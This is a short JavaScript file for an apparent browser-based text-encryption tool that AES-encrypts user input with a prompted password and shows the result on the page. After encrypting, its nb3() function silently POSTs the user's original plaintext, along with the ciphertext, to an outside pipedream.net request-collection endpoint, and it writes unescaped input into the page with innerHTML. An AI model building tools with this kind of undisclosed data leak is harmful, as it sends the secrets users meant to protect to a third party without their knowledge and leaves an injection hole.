function sr(){
    var name = prompt("What is your Name")
    var myString = document.getElementById("Input").value;
    var myPassword = prompt("What is the password")
    var encrypted = CryptoJS.AES.encrypt(myString, myPassword)
    alert(encrypted)
    document.getElementById("text").innerHTML = "Input:" + myString + "<br>" + "Encrypted text:" + encrypted;
    document.getElementById("orginialtext").innerHTML= myString
    document.getElementById("encryptedtext").innerHTML = encrypted.toString()
    nb3()
}
function nb3(){
    const originaltext = document.getElementById("orginialtext").innerHTML;
    const encryptedtext = document.getElementById("encryptedtext").innerHTML;
    const headers = new Headers()
    headers.append("Content-Type", "application/json")

    const body = {"Orginal Text":originaltext,"New Text":encryptedtext}

    const options = {
        method: "POST",
        headers,
        mode: "cors",
        body: JSON.stringify(body),
    }

    fetch("https://enex15omhr34.x.pipedream.net/", options)
}
